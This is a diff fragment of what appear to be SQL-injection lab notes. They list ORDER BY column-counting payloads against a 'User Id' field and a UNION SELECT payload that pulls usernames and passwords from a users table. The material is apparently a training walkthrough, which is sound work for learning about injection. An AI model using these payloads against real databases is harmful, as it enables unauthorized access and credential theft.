@@ -16,7 +16,9 @@ User Id -->
 ' ORDER BY 3#
 
 
-' ORDER BY 2# <br />
+' ORDER BY 2# 
+
+
 ' UNION SELECT user, password FROM users#       (# for commenting the rest of the statements after the query.)
 
 
